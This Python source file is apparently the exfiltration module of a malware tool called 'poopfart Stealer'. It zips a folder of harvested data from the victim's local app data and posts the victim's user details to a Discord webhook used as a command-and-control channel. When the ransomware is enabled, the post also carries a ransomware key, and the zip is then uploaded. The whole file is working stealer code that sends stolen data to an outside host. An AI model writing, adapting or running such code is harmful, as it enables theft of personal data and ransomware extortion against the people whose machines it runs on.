import requests
import os
import zipfile
from plugins.screenshot import Screenshot

class Send_Discord(object):
    """
    Sends content to our webhook acting as a cnc
    """
    def __init__(self, webhook, userdata,  ransomware_key, renabled):
        self.webhook = webhook
        self.userdata = userdata
        self.ransomware_key = ransomware_key
        self.renabled = renabled
        self.send_file()

    def zip_dir(self, path, zipf):
        """
        Zips the folder path
        """
        for root, dirs, files in os.walk(path):
            for file in files:
                zipf.write(os.path.join(path, file), file)

    def send_file(self):
        """
        Sends our current zipped poopfart directory to your webhook
        """
        ap = os.getenv("LOCALAPPDATA")
        temp = os.path.join(ap, "poopfart")
        new = os.path.join(ap, 'poopfart-[%s].zip' % os.getlogin())
        zipf = zipfile.ZipFile(new, 'w', zipfile.ZIP_DEFLATED)
        self.zip_dir(temp, zipf)
        zipf.close()
        if self.renabled == False: key = "Ransomware: Not Enabled"
        else: key = "RansomwareKey: %s" % self.ransomware_key.decode()
        alert = {
                  "avatar_url":"https://media.discordapp.net/attachments/1111758123582099496/1120470110356901988/healavatar_iNqHe1Gk.gif",
                  "name":"poopfart Stealer",
                  "embeds": [
                    {
                      "title": "poopfart Stealer",
                      "description": "Someone just ran poopfart!\nHere are the current stats of the user:\n ```asciidoc\n%s\n%s\n```" % (self.userdata, key),
                      "color": 0x000000,

                      "thumbnail": {
                        "url": "https://media.discordapp.net/attachments/1111758123582099496/1120470110356901988/healavatar_iNqHe1Gk.gif"
                      }
                    }
                  ]
                }
        requests.post(self.webhook,json=alert)
        requests.post(self.webhook, files={'upload_file': open(new,'rb')})
